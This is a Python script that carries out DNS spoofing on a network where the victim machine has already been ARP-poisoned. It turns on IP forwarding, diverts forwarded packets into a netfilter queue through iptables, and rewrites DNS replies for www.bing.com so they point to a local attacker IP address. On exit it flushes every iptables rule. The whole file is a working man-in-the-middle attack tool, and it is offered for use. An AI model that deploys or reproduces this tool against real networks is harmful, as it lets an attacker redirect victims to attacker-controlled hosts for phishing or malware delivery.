#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy


def packet_interpreter(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # print(qname)

        # dns spoofing bing.com,this can be changed to whatever server we want and spoof the dns with rdata
        if 'www.bing.com' in qname.decode():
            print('\n[+]Spoofing Target...')
            answer = scapy.DNSRR(rrname=qname, rdata='192.168.43.33')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            if scapy.IP:
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
            if scapy.UDP:
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


try:
    # For Real Arp Poisoned PC
    subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
    subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

    # To Test Code on Local PC
    # subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    # subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, packet_interpreter)
    queue.run()
except KeyboardInterrupt:
    print('\nFlushing IP Tables')

    # To Disable IP Forwarding
    # subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)
    subprocess.call('iptables --flush', shell=True)